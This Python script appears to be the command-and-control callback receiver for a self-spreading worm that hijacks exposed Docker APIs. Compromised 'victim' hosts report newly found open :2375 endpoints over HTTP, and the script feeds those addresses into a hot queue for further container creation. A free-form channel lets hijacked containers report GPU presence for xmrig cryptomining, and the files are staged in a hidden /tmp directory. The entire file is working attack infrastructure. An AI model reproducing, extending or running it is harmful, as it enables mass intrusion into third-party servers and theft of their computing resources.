#!/usr/bin/env python3
# ============================================================================
# nestd - the callback receiver for nested scanners.
#
# Victims cannot be trusted to give us a readable stream: measured on a real
# daemon (Docker 29.8.0), GET /containers/<id>/logs and POST /exec/<id>/start both
# return EMPTY while the plain JSON routes work fine. So a nested scanner reports
# by HTTP instead - one wget per hit, straight into the queue box1 already reads.
#
#   GET /hit?ip=X&f=Y   -> append "X\tnest" to .hunt/mass.found (deduped)
#   GET /alive?ip=Y     -> liveness breadcrumb for the victim
#   GET /stat           -> counters, for humans
#
# Box1 only reads mass.found; this just fills it, so a hit from a victim is
# indistinguishable downstream from a hit from the sweep - which is the point.
# ============================================================================
import http.server
import os
import socketserver
import threading
import time
import urllib.parse

HUNT = os.environ.get("HUNT_WORK", "/tmp/.sysd/.hunt")
PORT = int(os.environ.get("NEST_PORT", "8080"))
MASS = os.path.join(HUNT, "mass.found")
ALIVE = os.path.join(HUNT, "nest.alive")
HITLOG = "/tmp/_nestd.hits"
NOTELOG = "/tmp/_nestd.notes"
# ---- hot queue ------------------------------------------------------------------
# A hit is the freshest thing we own: a victim proved :2375 was open seconds ago,
# while measured ~88% of the endpoints already sitting in mass.found are silent by
# the time dock.sh walks to them. So every hit also lands in a small queue that
# dockhot.sh drains every minute (create+start only), separate from the big sweep
# queue. hot.tried holds ones that already failed, so a dead address does not
# bounce between the two forever.
HOT = os.path.join(HUNT, "hot.queue")
HOTTRIED = os.path.join(HUNT, "hot.tried")
HOT_MAX = 800

lock = threading.Lock()
known = set()
hot_seen = set()
hot_tried = set()
TALLY = {"hits": 0, "fresh": 0, "notes": 0}


def load_known():
    try:
        with open(MASS, "r", errors="ignore") as fh:
            for line in fh:
                ip = line.split("\t")[0].strip()
                if ip:
                    known.add(ip)
    except FileNotFoundError:
        pass
    try:
        with open(HOT, "r", errors="ignore") as fh:
            for line in fh:
                ip = line.split("\t")[0].strip()
                if ip:
                    hot_seen.add(ip)
    except FileNotFoundError:
        pass
    try:
        with open(HOTTRIED, "r", errors="ignore") as fh:
            for line in fh.readlines()[-1500:]:
                ip = line.split("\t")[0].strip()
                if ip:
                    hot_tried.add(ip)
    except FileNotFoundError:
        pass


def queue_hot(ip):
    """Queue a hit for the fast path, once, bounded."""
    if ip in hot_seen or ip in hot_tried:
        return
    try:
        with open(HOT, "a") as fh:
            fh.write("%s\t%d\n" % (ip, int(time.time())))
            fh.flush()
        hot_seen.add(ip)
    except OSError:
        return
    if len(hot_seen) > HOT_MAX:
        # safety valve: dockhot normally drains us well before this
        try:
            lines = open(HOT, "r", errors="ignore").readlines()[-HOT_MAX // 2:]
            with open(HOT, "w") as fh:
                fh.writelines(lines)
        except OSError:
            pass


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(u.query)
        ip = (q.get("ip") or [""])[0].strip()
        who = (q.get("f") or [""])[0].strip()
        if u.path == "/hit" and ip:
            with lock:
                fresh = ip not in known
                TALLY["hits"] += 1
                if fresh:
                    known.add(ip)
                    TALLY["fresh"] += 1
                    with open(MASS, "a") as fh:
                        fh.write("%s\tnest\n" % ip)
                # Log EVERY hit, not just fresh ones. The cursor spends its first
                # passes inside already-swept space, so a healthy scanner mostly
                # reports addresses we already know - and when only fresh hits were
                # logged, "1 hit" was indistinguishable from "the scanner is dead".
                with open(HITLOG, "a") as fh:
                    fh.write("%s\t%s\t%s\t%s\n" % (time.strftime("%H:%M:%S"), ip, "fresh" if fresh else "dup", who))
                queue_hot(ip)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok" if fresh else b"dup")
            return
        if u.path == "/alive" and ip:
            with open(ALIVE, "a") as fh:
                fh.write("%s\t%s\n" % (time.strftime("%H:%M:%S"), ip))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            return
        if u.path == "/note":
            # Generic reporting channel. /logs and exec-start return empty on these
            # daemons, so ANY question we ask a container ("is there a GPU", "which
            # xmrig image has CUDA") has to come back as an HTTP call, never as
            # stdout. Free-form, one query param, no '&' so the caller needs no
            # quoting inside a JSON Cmd.
            msg = (q.get("m") or [""])[0]
            with lock:
                TALLY["notes"] += 1
                with open(NOTELOG, "a") as fh:
                    fh.write("%s\t%s\n" % (time.strftime("%H:%M:%S"), msg))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            return
        if u.path == "/stat":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(("known=%d hits=%d fresh=%d notes=%d hot=%d hot_tried=%d\n" % (len(known), TALLY["hits"], TALLY["fresh"], TALLY["notes"], len(hot_seen), len(hot_tried))).encode())
            return
        self.send_response(404)
        self.end_headers()


socketserver.ThreadingTCPServer.allow_reuse_address = True
with socketserver.ThreadingTCPServer(("0.0.0.0", PORT), Handler) as srv:
    load_known()
    srv.serve_forever()
